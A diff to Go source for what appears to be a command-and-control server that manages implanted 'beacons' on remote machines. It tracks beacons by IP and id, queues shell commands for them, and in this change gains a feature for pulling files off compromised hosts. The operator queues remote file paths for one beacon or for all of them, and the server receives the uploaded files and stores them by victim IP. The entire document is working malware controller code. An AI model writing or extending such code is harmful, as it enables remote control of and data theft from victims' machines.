@@ -9,9 +9,12 @@ import (
 	"net/http"
 	"strconv"
 	"os"
+	"io"
 	"os/exec"
 	"strings"
 	"bufio"
+	"io/ioutil"
+	"bytes"
 	b64 "encoding/base64"
 )
 
@@ -26,6 +29,7 @@ type Beacon struct {
 	Ip string
 	Id string
 	ExecBuffer []string
+	DownloadBuffer []string
 	LastSeen time.Time
 }
 
@@ -36,15 +40,60 @@ var cmdArgs = map[string]string {
 	"list": "",
     "exec": "<beacon id OR index> <command>...",
     "create": "<LHOST> <LPORT>",
-	"download": "<beacon id OR index> <remote file> <save location> OR <remote file> <save location>...",
+	"download": "<beacon id OR index> <remote file> OR <remote file>...",
 	"use": "<beacon id OR index>",
+}
+
+func receiveFile(beacon *Beacon, w http.ResponseWriter, r *http.Request) {
+    r.ParseMultipartForm(32 << 20)
+    var buf bytes.Buffer
+    file, header, err := r.FormFile("file")
+	
+	if err != nil {
+        fmt.Println("Failed to receive file.")
+		return
+    }
+
+    defer file.Close()
+    name := strings.Split(header.Filename, "/")
+    io.Copy(&buf, file)
+    saveBeaconFile(beacon, buf, name[len(name)-1])
+    buf.Reset()
+}
+
+func saveBeaconFile(beacon *Beacon, data bytes.Buffer, name string) {
+	path := "downloads"
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		os.Mkdir(path, 0700)
+	}
+	path += "/" + beacon.Ip
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		os.Mkdir(path, 0700)
+	}
+	path += "/" + beacon.Id
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		os.Mkdir(path, 0700)
+	}
+
+	err := ioutil.WriteFile(path + "/" + name, data.Bytes(), 0644)
+    if err != nil {
+		fmt.Println("Failed to save file.")
+	}
+
+	cwd, err := os.Getwd()
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	fmt.Println("Saved " + name + " from " + beacon.Id + "@" + beacon.Ip + " to " + cwd + "/" + path + "/" + name)
 }
 
 func interfaceHandler(w http.ResponseWriter, h *http.Request) {
 	json.NewEncoder(w).Encode(map[string]bool{"ok": true})
 }
 
-func beaconHandler(w http.ResponseWriter, r *http.Request) {
+func beaconGetHandler(w http.ResponseWriter, r *http.Request) {
 	var update CommandUpdate
 	data := mux.Vars(r)["data"]
 	respMap := make(map[string][]string)
@@ -54,9 +103,11 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 	beacon := registerBeacon(update)
 	
 	respMap["exec"] = beacon.ExecBuffer
+	respMap["download"] = beacon.DownloadBuffer
 
 	json.NewEncoder(w).Encode(respMap)
 	beacon.ExecBuffer = nil
+	beacon.DownloadBuffer = nil
 
 	if len(update.Data) > 0 {
 		out := strings.Replace(update.Data, "\n", "\n\t", -1)
@@ -66,10 +117,25 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+func beaconPostHandler(w http.ResponseWriter, r *http.Request) {
+	var update CommandUpdate
+	data := mux.Vars(r)["data"]
+	decoded, _ := b64.StdEncoding.DecodeString(data)
+	
+	json.Unmarshal(decoded, &update)
+	beacon := registerBeacon(update)
+
+	if update.Type == "upload" {
+		fmt.Println("Receiving " + update.Data + " from " + beacon.Id)
+		receiveFile(beacon, w, r)
+	}
+}
+
 func startServerRoutine() {
 	var router = mux.NewRouter()
 	router.HandleFunc("/", interfaceHandler).Host("localhost")
-	router.HandleFunc("/{data}", beaconHandler).Host("command.com").Methods("Get")
+	router.HandleFunc("/{data}", beaconPostHandler).Host("command.com").Methods("Post")
+	router.HandleFunc("/{data}", beaconGetHandler).Host("command.com").Methods("Get")
 
 	srv := &http.Server{
         Handler:      router,
@@ -92,7 +158,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	}
 
 	if beacon == nil {
-		beacon = &Beacon{updateData.Ip, updateData.Id, nil, time.Now()}
+		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, time.Now()}
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -136,6 +202,29 @@ func execOnBeacon(cmd []string) {
 	}
 }
 
+func downloadFile(cmd []string) {
+	if cmd[1] == "*" {
+		for _, b := range beacons {
+			b.DownloadBuffer = append(b.DownloadBuffer, cmd[2])
+		}
+		return	
+	}
+
+	var beacon *Beacon = activeBeacon
+	var cmdIndex = 1
+	if beacon == nil {
+		beacon = getBeaconByIdOrIndex(cmd[1])
+		cmdIndex = 2
+	}
+
+	if beacon != nil {
+		beacon.DownloadBuffer = append(beacon.DownloadBuffer, cmd[cmdIndex])
+		fmt.Println("Added download command for beacon " + beacon.Id + "@" + beacon.Ip)
+	} else {
+		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+	}
+}
+
 func getBeaconByIdOrIndex(id string) (*Beacon) {
 	var beacon *Beacon
 
@@ -170,10 +259,6 @@ func checkArgs(cmd[] string) (bool) {
 	return true
 }
 
-func downloadFile(cmd []string) {
-
-}
-
 func printHelp(cmd []string) {
 	if len(cmd) == 2 {
 		if val, ok := cmdArgs[cmd[1]]; ok {
@@ -190,7 +275,7 @@ func printHelp(cmd []string) {
 
 func processInput(input string) {
 	cmd := strings.Fields(input);
-	if checkArgs(cmd) {
+	if len(cmd) > 0 && checkArgs(cmd) {
 		switch cmd[0] {
 		case "exec":
 			execOnBeacon(cmd)
@@ -207,6 +292,8 @@ func processInput(input string) {
 			}
 		case "help":
 			printHelp(cmd)
+		default:
+			fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
 		}
 	}
 }
